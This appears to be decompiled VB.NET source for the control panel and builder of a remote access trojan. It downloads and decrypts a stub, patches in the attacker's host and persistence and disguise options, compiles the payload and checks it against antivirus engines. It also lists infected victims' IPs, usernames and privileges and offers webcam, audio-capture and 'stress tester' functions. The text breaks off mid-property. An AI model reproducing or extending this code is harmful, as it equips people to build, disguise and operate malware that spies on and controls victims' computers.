        Private Sub RestartToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim str3 As String = String.Concat(New String() { Me.listviewmain.SelectedItems.Item(0).SubItems.Item(6).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(1).Text, "@", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(2).Text })
                Dim host As String = str3.Split(New Char() { "|"c })(0)
                Dim file As String = str3.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.client.sendcmd("RServer", host, file), True, False))) Then
                    Interaction.MsgBox("An error has occured !", MsgBoxStyle.Critical, Nothing)
                Else
                    Interaction.MsgBox("Command sent!", MsgBoxStyle.Information, Nothing)
                    Me.client.delete(host, String.Concat(New String() { "*", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(2).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(1).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(0).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(3).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(5).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(4).Text }), file)
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub RetrieveNews()
            Try 
                Dim postMessage As String = LicenseGlobal.Seal.GetPostMessage(Me.ID)
                If Not String.IsNullOrEmpty(postMessage) Then
                    Me.Invoke(New DelegateWriteOutput(AddressOf Me.writeoutput), New Object() { Me.rtbnews, postMessage })
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Shared Function RijndaelDecrypt(ByVal UDecryptU As String, ByVal UKeyU As String) As Object
            Dim managed As New RijndaelManaged
            Dim salt As Byte() = New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 }
            Dim bytes As New Rfc2898DeriveBytes(UKeyU, salt)
            managed.Key = bytes.GetBytes(managed.Key.Length)
            managed.IV = bytes.GetBytes(managed.IV.Length)
            Dim stream2 As New MemoryStream
            Dim stream As New CryptoStream(stream2, managed.CreateDecryptor, CryptoStreamMode.Write)
            Try 
                Dim buffer As Byte() = Convert.FromBase64String(UDecryptU)
                stream.Write(buffer, 0, buffer.Length)
                stream.Close
                UDecryptU = Encoding.UTF8.GetString(stream2.ToArray)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
            Return UDecryptU
        End Function

        Public Sub rsize(ByVal o As Object)
            Dim arguments As Object() = New Object(1  - 1) {}
            Dim size As New Size(0, 0)
            arguments(0) = size
            NewLateBinding.LateSet(o, Nothing, "size", arguments, Nothing, Nothing)
        End Sub

        Public Sub scanner()
            Try 
                Dim form As New MultipartForm("https://anonscanner.com/api.php")
                form.setField("uid", "89")
                form.setField("api_key", LicenseGlobal.Seal.GetVariable("apikey"))
                form.sendFile(Me.path)
                form.setField("return", "results")
                Me.GetScanResults(form.ResponseText.ToString)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                Me.pb_scan.Image = Nothing
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub servercreate()
            Try 
                Me.Invoke(New DelegateWriteOutput(AddressOf Me.writeoutput), New Object() { Me.rtb_output, Operators.ConcatenateObject(Me.Gettime, " Connecting to Cloud Stub Server") })
                Me.ProgressBar1.Value = 15
                Me.Invoke(New DelegateWriteOutput(AddressOf Me.writeoutput), New Object() { Me.rtb_output, Operators.ConcatenateObject(Me.Gettime, " Authenticating Information") })
                Me.ProgressBar1.Value = 30
                Dim uDecryptU As String = New WebClient().DownloadString(LicenseGlobal.Seal.GetVariable("stuburl"))
                Me.Invoke(New DelegateWriteOutput(AddressOf Me.writeoutput), New Object() { Me.rtb_output, Operators.ConcatenateObject(Me.Gettime, " Downloading Cloud Stub") })
                Me.ProgressBar1.Value = &H2D
                Me.cleansource = Conversions.ToString(Form1.RijndaelDecrypt(uDecryptU, LicenseGlobal.Seal.GetVariable("stubkey")))
                Me.Invoke(New DelegateWriteOutput(AddressOf Me.writeoutput), New Object() { Me.rtb_output, Operators.ConcatenateObject(Me.Gettime, " Compiling Stub") })
                Me.ProgressBar1.Value = 60
                Me.cleansource = Me.cleansource.Replace("HOSTHERE", Me.tb_host.Text)
                Me.cleansource = Me.cleansource.Replace("ASSEMBLYTITLE", Me.tb_assemblytitle.Text)
                Me.cleansource = Me.cleansource.Replace("ASSEMBLYDESCRIPTION", Me.tb_assemblydescription.Text)
                Me.cleansource = Me.cleansource.Replace("ASSEMBLYCOMPANY", Me.tb_assemblycompany.Text)
                Me.cleansource = Me.cleansource.Replace("ASSEMBLYPRODUCT", Me.tb_assemblyproduct.Text)
                Me.cleansource = Me.cleansource.Replace("ASSEMBLYCOPYRIGHT", Me.tb_assemblycopyright.Text)
                Me.cleansource = Me.cleansource.Replace("ASSEMBLYTRADEMARK", Me.tb_assemblytrademark.Text)
                If (Me.tb_assemblyversion.Text <> "") Then
                    Me.cleansource = Me.cleansource.Replace("3.5.2.4", Me.tb_assemblyversion.Text)
                Else
                    Me.cleansource = Me.cleansource.Replace("3.5.2.4", "0.0.0.0")
                End If
                If (Me.tb_assemblyfileversion.Text <> "") Then
                    Me.cleansource = Me.cleansource.Replace("0.0.0.0", Me.tb_assemblyfileversion.Text)
                Else
                    Me.cleansource = Me.cleansource.Replace("0.0.0.0", "0.0.0.0")
                End If
                Me.cleansource = Me.cleansource.Replace("INSTALLENABLE", Conversions.ToString(Me.cb_install_enable.Checked))
                Me.cleansource = Me.cleansource.Replace("INSTALLTOENABLE", Conversions.ToString(Me.cb_install.Checked))
                Me.cleansource = Me.cleansource.Replace("RB_APPDATA", Conversions.ToString(Me.rb_appdata.Checked))
                Me.cleansource = Me.cleansource.Replace("RB_TEMP", Conversions.ToString(Me.rb_temp.Checked))
                Me.cleansource = Me.cleansource.Replace("INSTALLPATH", Me.tb_install_path.Text)
                Me.cleansource = Me.cleansource.Replace("CB_MELT", Conversions.ToString(Me.cb_melt.Checked))
                Me.cleansource = Me.cleansource.Replace("RB_HKCU", Conversions.ToString(Me.cb_hkcu.Checked))
                Me.cleansource = Me.cleansource.Replace("RB_HKLM", Conversions.ToString(Me.cb_hklm.Checked))
                Dim compiler As ICodeCompiler = New VBCodeProvider().CreateCompiler
                Dim options As New CompilerParameters
                options.ReferencedAssemblies.Add("System.dll")
                options.ReferencedAssemblies.Add("System.Windows.Forms.dll")
                options.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
                options.ReferencedAssemblies.Add("System.Management.dll")
                options.ReferencedAssemblies.Add("System.Drawing.dll")
                options.GenerateExecutable = True
                options.OutputAssembly = Me.path
                options.CompilerOptions = "/target:winexe"
                If Me.cb_icon.Checked Then
                    Dim parameters2 As CompilerParameters = options
                    parameters2.CompilerOptions = (parameters2.CompilerOptions & " /win32icon:" & Me.icnpath)
                End If
                Dim results As CompilerResults = compiler.CompileAssemblyFromSource(options, Me.cleansource)
                If results.Errors.HasErrors Then
                    Dim enumerator As IEnumerator
                    Dim prompt As String = "Compiler error:"
                    Try 
                        enumerator = results.Errors.GetEnumerator
                        Do While enumerator.MoveNext
                            prompt = (prompt & DirectCast(enumerator.Current, CompilerError).ToString & ChrW(13) & ChrW(10))
                        Loop
                    Finally
                        If TypeOf enumerator Is IDisposable Then
                            TryCast(enumerator,IDisposable).Dispose
                        End If
                    End Try
                    Interaction.MsgBox(prompt, MsgBoxStyle.ApplicationModal, "Error while compiling")
                End If
                Me.ProgressBar1.Value = &H4B
                Me.Invoke(New DelegateWriteOutput(AddressOf Me.writeoutput), New Object() { Me.rtb_output, Operators.ConcatenateObject(Operators.ConcatenateObject(Me.Gettime, " Server successfully saved at: "), Me.path) })
                Me.ProgressBar1.Value = 100
                If Me.cb_savesettings.Checked Then
                    Dim s As String = String.Concat(New String() { Me.tb_host.Text, "|", Conversions.ToString(Me.cb_install_enable.Checked), "|", Conversions.ToString(Me.cb_install.Checked), "|", Conversions.ToString(Me.rb_appdata.Checked), "|", Conversions.ToString(Me.rb_temp.Checked), "|", Me.tb_install_path.Text, "|", Conversions.ToString(Me.cb_melt.Checked), "|", Conversions.ToString(Me.cb_hkcu.Checked), "|", Conversions.ToString(Me.cb_hklm.Checked), "|", Me.tb_assemblytitle.Text, "|", Me.tb_assemblydescription.Text, "|", Me.tb_assemblycompany.Text, "|", Me.tb_assemblyproduct.Text, "|", Me.tb_assemblycopyright.Text, "|", Me.tb_assemblytrademark.Text, "|", Me.tb_assemblyversion.Text, "|", Me.tb_assemblyfileversion.Text, "|", Conversions.ToString(Me.cb_icon.Checked), "|", Me.icnpath, "|" })
                    File.WriteAllBytes((Application.StartupPath & "\settings.xnt"), Encoding.UTF8.GetBytes(s))
                End If
                If MySettingsProperty.Settings.autoscan Then
                    Me.scanning = New Thread(New ThreadStart(AddressOf Me.scanner))
                    Me.scanning.Start
                    Me.Invoke(New delegatechangeimage(AddressOf Me.changeimage), New Object() { Me.pb_scan })
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Exclamation, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub ShowNotifiction(ByVal input As String)
            Try 
                If (input = "LOST") Then
                    Me.Notify.Visible = True
                    If MySettingsProperty.Settings.sound Then
                        MyProject.Computer.Audio.Play(Resources.notify, AudioPlayMode.Background)
                    End If
                    Me.Notify.BalloonTipText = "?"
                    Me.Notify.BalloonTipIcon = ToolTipIcon.Error
                    Me.Notify.BalloonTipTitle = "Connection Lost!"
                    Me.Notify.ShowBalloonTip(&H3E8)
                Else
                    input = input.Remove(0, 2)
                    If (Me.CountCharacter(input, "*"c) >= 2) Then
                        Dim num As Integer = (Me.CountCharacter(input, "*"c) - 1)
                        Me.i = 0
                        Do While (Me.i <= num)
                            Me.Notify.Visible = True
                            If MySettingsProperty.Settings.sound Then
                                MyProject.Computer.Audio.Play(Resources.notify, AudioPlayMode.Background)
                            End If
                            Me.Notify.BalloonTipText = String.Concat(New String() { "IP: ", input.Split(New Char() { "*"c })(Me.i).Split(New Char() { "|"c })(0), ChrW(13) & ChrW(10) & "Username: ", input.Split(New Char() { "*"c })(Me.i).Split(New Char() { "|"c })(1), ChrW(13) & ChrW(10) & "Country: ", input.Split(New Char() { "*"c })(Me.i).Split(New Char() { "|"c })(2), ChrW(13) & ChrW(10) & "Operating System: ", input.Split(New Char() { "*"c })(Me.i).Split(New Char() { "|"c })(3), ChrW(13) & ChrW(10) & "Privilegs: ", input.Split(New Char() { "*"c })(Me.i).Split(New Char() { "|"c })(4), ChrW(13) & ChrW(10) & "Version: ", input.Split(New Char() { "*"c })(Me.i).Split(New Char() { "|"c })(5), ChrW(13) & ChrW(10) & "Host: ", input.Split(New Char() { "*"c })(Me.i).Split(New Char() { "|"c })(6) })
                            Me.Notify.BalloonTipIcon = ToolTipIcon.Info
                            Me.Notify.BalloonTipTitle = "New Connection!"
                            Me.Notify.ShowBalloonTip(&H3E8)
                            Me.i += 1
                        Loop
                    Else
                        Me.Notify.Visible = True
                        If MySettingsProperty.Settings.sound Then
                            MyProject.Computer.Audio.Play(Resources.notify, AudioPlayMode.Background)
                        End If
                        Me.Notify.BalloonTipText = String.Concat(New String() { "IP: ", input.Split(New Char() { "|"c })(0), ChrW(13) & ChrW(10) & "Username: ", input.Split(New Char() { "|"c })(1), ChrW(13) & ChrW(10) & "Country: ", input.Split(New Char() { "|"c })(2), ChrW(13) & ChrW(10) & "Operating System: ", input.Split(New Char() { "|"c })(3), ChrW(13) & ChrW(10) & "Privilegs: ", input.Split(New Char() { "|"c })(4), ChrW(13) & ChrW(10) & "Version: ", input.Split(New Char() { "|"c })(5), ChrW(13) & ChrW(10) & "Host: ", input.Split(New Char() { "|"c })(6) })
                        Me.Notify.BalloonTipIcon = ToolTipIcon.Info
                        Me.Notify.BalloonTipTitle = "New Connection!"
                        Me.Notify.ShowBalloonTip(&H3E8)
                    End If
                    Me.onconnect
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub ShowToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.Show
        End Sub

        Private Sub STRESSTesterToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim enumerator As IEnumerator
                Try 
                    enumerator = Me.listviewmain.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Dim stressTester As StressTester = MyProject.Forms.StressTester
                        stressTester.connected = String.Concat(New String() { stressTester.connected, current.SubItems.Item(6).Text, "|", current.SubItems.Item(1).Text, "@", current.SubItems.Item(2).Text, "#" })
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator,IDisposable).Dispose
                    End If
                End Try
                If (MyProject.Forms.StressTester.connected <> "") Then
                    MyProject.Forms.StressTester.Show
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub stubinfo()
            Try 
                Me.Invoke(New DelegateWriteText2(AddressOf Me.writetext2), New Object() { Me.Labelstubinfo, New WebClient().DownloadString("http://xanity.eu/app/stubinfo.txt") })
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub SystemInformationToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                MyProject.Forms.SystemInformation.connected = String.Concat(New String() { Me.listviewmain.SelectedItems.Item(0).SubItems.Item(6).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(1).Text, "@", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(2).Text })
                MyProject.Forms.SystemInformation.Show
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub tb_host_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.tb_host.Text = "Example: http://127.0.0.1") Then
                Me.tb_host.Text = ""
            End If
            Me.tb_host.ForeColor = Color.Black
        End Sub

        Private Sub tb_host_DropDown(ByVal sender As Object, ByVal e As EventArgs)
            Me.tb_host.Items.Clear
            Dim num2 As Integer = Me.CountCharacter(MySettingsProperty.Settings.hosts, "|"c)
            Dim i As Integer = 0
            Do While (i <= num2)
                Me.tb_host.Items.Add(MySettingsProperty.Settings.hosts.Split(New Char() { "|"c })(i))
                i += 1
            Loop
        End Sub

        Private Sub tb_install_path_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.tb_install_path.Text = "Example: File.exe") Then
                Me.tb_install_path.Text = ""
            End If
            Me.tb_install_path.ForeColor = Color.White
        End Sub

        Private Sub tb_runfile_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
            MySettingsProperty.Settings.onc_down = Me.tb_runfile.Text
            MySettingsProperty.Settings.Save
        End Sub

        Private Sub tb_web_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
            MySettingsProperty.Settings.onc_website = Me.tb_web.Text
            MySettingsProperty.Settings.Save
        End Sub

        Private Sub toggleweb_CheckedChanged(ByVal sender As Object)
            MySettingsProperty.Settings.onconnect_web = Me.toggleweb.Checked
            MySettingsProperty.Settings.Save
        End Sub

        Private Sub ToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                If (Me.boxhosts.SelectedItem <> "") Then
                    Me.DisconnectToolStripMenuItem.PerformClick
                    MySettingsProperty.Settings.hosts = MySettingsProperty.Settings.hosts.Replace(("|" & Me.boxhosts.SelectedItem), "")
                    MySettingsProperty.Settings.Save
                    Dim i As Integer = 0
                    Do While (i <> 9)
                        Me.ConnectToolStripMenuItem.DropDownItems.RemoveAt(1)
                        i += 1
                    Loop
                    Me.Form1_Load(RuntimeHelpers.GetObjectValue(sender), e)
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.Form1_Load(RuntimeHelpers.GetObjectValue(sender), e)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub UninstallToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim str3 As String = String.Concat(New String() { Me.listviewmain.SelectedItems.Item(0).SubItems.Item(6).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(1).Text, "@", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(2).Text })
                Dim host As String = str3.Split(New Char() { "|"c })(0)
                Dim file As String = str3.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.client.sendcmd("Uninstall", host, file), True, False))) Then
                    Interaction.MsgBox("An error has occured !", MsgBoxStyle.Critical, Nothing)
                Else
                    Interaction.MsgBox("Command sent!", MsgBoxStyle.Information, Nothing)
                    Me.client.delete(host, String.Concat(New String() { "*", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(2).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(1).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(0).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(3).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(5).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(4).Text }), file)
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub updateserver_Tick(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.itemscountbefore = ""
                Dim num4 As Integer = (Me.listviewmain.Items.Count - 1)
                Dim i As Integer = 0
                Do While (i <= num4)
                    Me.itemscountbefore = String.Concat(New String() { Me.itemscountbefore, "*", Me.listviewmain.Items.Item(i).SubItems.Item(2).Text, "|", Me.listviewmain.Items.Item(i).SubItems.Item(1).Text, "|", Me.listviewmain.Items.Item(i).SubItems.Item(0).Text, "|", Me.listviewmain.Items.Item(i).SubItems.Item(3).Text, "|", Me.listviewmain.Items.Item(i).SubItems.Item(5).Text, "|", Me.listviewmain.Items.Item(i).SubItems.Item(4).Text, "|", Me.listviewmain.Items.Item(i).SubItems.Item(6).Text, "|" })
                    i += 1
                Loop
                Me.ListView1.Items.Clear
                Me.itemscountafter = ""
                Dim num5 As Integer = (Me.CountCharacter(Me.curconnected, "|"c) - 1)
                Dim j As Integer = 0
                Do While (j <= num5)
                    Me.addtofakelistview(Conversions.ToString(Me.client.check(Me.curconnected.Split(New Char() { "|"c })(j))), 0, Me.curconnected.Split(New Char() { "|"c })(j))
                    j += 1
                Loop
                Dim num6 As Integer = (Me.ListView1.Items.Count - 1)
                Dim k As Integer = 0
                Do While (k <= num6)
                    Me.itemscountafter = String.Concat(New String() { Me.itemscountafter, "*", Me.ListView1.Items.Item(k).SubItems.Item(2).Text, "|", Me.ListView1.Items.Item(k).SubItems.Item(1).Text, "|", Me.ListView1.Items.Item(k).SubItems.Item(0).Text, "|", Me.ListView1.Items.Item(k).SubItems.Item(3).Text, "|", Me.ListView1.Items.Item(k).SubItems.Item(5).Text, "|", Me.ListView1.Items.Item(k).SubItems.Item(4).Text, "|", Me.ListView1.Items.Item(k).SubItems.Item(6).Text, "|" })
                    k += 1
                Loop
                Me.itemscountafter = Me.itemscountafter.Replace(ChrW(10), "")
                If (Me.itemscountbefore.Length < Me.itemscountafter.Length) Then
                    Me.listviewmain.Items.Clear
                    Me.itemscountafter = (Me.itemscountafter & "*")
                    Dim num7 As Integer = (Me.CountCharacter(Me.itemscountafter, "*"c) - 1)
                    Me.i = 1
                    Do While (Me.i <= num7)
                        Me.addtolistview2(Me.itemscountafter.Split(New Char() { "*"c })(Me.i), 0, Me.itemscountafter.Split(New Char() { "|"c })(6))
                        Me.i += 1
                    Loop
                    If MySettingsProperty.Settings.notification Then
                        Me.ShowNotifiction(Me.itemscountafter.Remove(0, Me.itemscountbefore.Length))
                    End If
                ElseIf (Me.itemscountbefore.Length > Me.itemscountafter.Length) Then
                    Me.listviewmain.Items.Clear
                    Me.itemscountafter = (Me.itemscountafter & "*")
                    Dim num8 As Integer = (Me.CountCharacter(Me.itemscountafter, "*"c) - 1)
                    Me.i = 1
                    Do While (Me.i <= num8)
                        Me.addtolistview2(Me.itemscountafter.Split(New Char() { "*"c })(Me.i), 0, Me.itemscountafter.Split(New Char() { "|"c })(6))
                        Me.i += 1
                    Loop
                    If MySettingsProperty.Settings.notification Then
                        Me.ShowNotifiction("LOST")
                    End If
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub WebcamToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                MyProject.Forms.Webcam.connected = String.Concat(New String() { Me.listviewmain.SelectedItems.Item(0).SubItems.Item(6).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(1).Text, "@", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(2).Text })
                MyProject.Forms.Webcam.Show
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub writeoutput(ByVal rtb As RichTextBox, ByVal [text] As String)
            Dim box As RichTextBox = rtb
            box.Text = (box.Text & [text] & ChrW(13) & ChrW(10))
        End Sub

        Public Sub writetext(ByVal label As StatusBar, ByVal [text] As String)
            label.Text = [text]
        End Sub

        Public Sub writetext2(ByVal label As Label, ByVal [text] As String)
            label.Text = [text]
        End Sub

        Public Sub writetext3(ByVal label As LinkLabel, ByVal [text] As String)
            label.Text = [text]
        End Sub


        ' Properties
        Friend Overridable Property AddNewToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._AddNewToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.AddNewToolStripMenuItem_Click)
                If (Not Me._AddNewToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._AddNewToolStripMenuItem.Click, handler
                End If
                Me._AddNewToolStripMenuItem = value
                If (Not Me._AddNewToolStripMenuItem Is Nothing) Then
                    AddHandler Me._AddNewToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property AudioCaptureToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._AudioCaptureToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.AudioCaptureToolStripMenuItem_Click)
                If (Not Me._AudioCaptureToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._AudioCaptureToolStripMenuItem.Click, handler
                End If
                Me._AudioCaptureToolStripMenuItem = value
                If (Not Me._AudioCaptureToolStripMenuItem Is Nothing) Then
                    AddHandler Me._AudioCaptureToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property avs As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._avs
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._avs = value
            End Set
        End Property

        Friend Overridable Property boxhosts As FlatListBox
            <DebuggerNonUserCode> _
            Get
                Return Me._boxhosts
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatListBox)
                Me._boxhosts = value
            End Set
        End Property

        Friend Overridable Property btn_build As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_build
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_build_Click)
                If (Not Me._btn_build Is Nothing) Then
                    RemoveHandler Me._btn_build.Click, handler
                End If
                Me._btn_build = value
                If (Not Me._btn_build Is Nothing) Then
                    AddHandler Me._btn_build.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_generate As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_generate
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_generate_Click)
                If (Not Me._btn_generate Is Nothing) Then
                    RemoveHandler Me._btn_generate.Click, handler
                End If
                Me._btn_generate = value
                If (Not Me._btn_generate Is Nothing) Then
                    AddHandler Me._btn_generate.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_load_settings As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_load_settings
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_load_settings_Click)
                If (Not Me._btn_load_settings Is Nothing) Then
                    RemoveHandler Me._btn_load_settings.Click, handler
                End If
                Me._btn_load_settings = value
                If (Not Me._btn_load_settings Is Nothing) Then
                    AddHandler Me._btn_load_settings.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_selecticn As FlatStickyButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_selecticn
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStickyButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_selecticn_Click)
                If (Not Me._btn_selecticn Is Nothing) Then
                    RemoveHandler Me._btn_selecticn.Click, handler
                End If
                Me._btn_selecticn = value
                If (Not Me._btn_selecticn Is Nothing) Then
                    AddHandler Me._btn_selecticn.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property cb_ac As FlatCheckBox
            <DebuggerNonUserCode> _
            Get
                Return Me._cb_ac
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCheckBox)
                Dim handler As CheckedChangedEventHandler = New CheckedChangedEventHandler(AddressOf Me.cb_ac_CheckedChanged)
                If (Not Me._cb_ac Is Nothing) Then
                    RemoveHandler Me._cb_ac.CheckedChanged, handler
                End If
                Me._cb_ac = value
                If (Not Me._cb_ac Is Nothing) Then
                    AddHandler Me._cb_ac.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property cb_hkcu As RadioButton
            <DebuggerNonUserCode> _
            Get
                Return Me._cb_hkcu
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As RadioButton)
                Me._cb_hkcu = value
            End Set
        End Property

        Friend Overridable Property cb_hklm As RadioButton
            <DebuggerNonUserCode> _
            Get
                Return Me._cb_hklm
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As RadioButton)
                Me._cb_hklm = value
            End Set
        End Property

        Friend Overridable Property cb_icon As FlatCheckBox
            <DebuggerNonUserCode> _
            Get
                Return Me._cb_icon
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCheckBox)
                Dim handler As CheckedChangedEventHandler = New CheckedChangedEventHandler(AddressOf Me.cb_icon_CheckedChanged)
                If (Not Me._cb_icon Is Nothing) Then
                    RemoveHandler Me._cb_icon.CheckedChanged, handler
                End If
                Me._cb_icon = value
                If (Not Me._cb_icon Is Nothing) Then
                    AddHandler Me._cb_icon.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property cb_install As FlatCheckBox
            <DebuggerNonUserCode> _
            Get
                Return Me._cb_install
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCheckBox)
                Dim handler As CheckedChangedEventHandler = New CheckedChangedEventHandler(AddressOf Me.cb_install_CheckedChanged)
                If (Not Me._cb_install Is Nothing) Then
                    RemoveHandler Me._cb_install.CheckedChanged, handler
                End If
                Me._cb_install = value
                If (Not Me._cb_install Is Nothing) Then
                    AddHandler Me._cb_install.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property cb_install_enable As FlatCheckBox
            <DebuggerNonUserCode> _
            Get
                Return Me._cb_install_enable
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCheckBox)
                Dim handler As CheckedChangedEventHandler = New CheckedChangedEventHandler(AddressOf Me.cb_install_enable_CheckedChanged)
                If (Not Me._cb_install_enable Is Nothing) Then
                    RemoveHandler Me._cb_install_enable.CheckedChanged, handler
                End If
                Me._cb_install_enable = value
                If (Not Me._cb_install_enable Is Nothing) Then
                    AddHandler Me._cb_install_enable.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property cb_melt As FlatCheckBox
            <DebuggerNonUserCode> _
            Get
                Return Me._cb_melt
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCheckBox)
                Me._cb_melt = value
            End Set
        End Property

        Friend Overridable Property cb_notify As FlatCheckBox
            <DebuggerNonUserCode> _
            Get
                Return Me._cb_notify
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
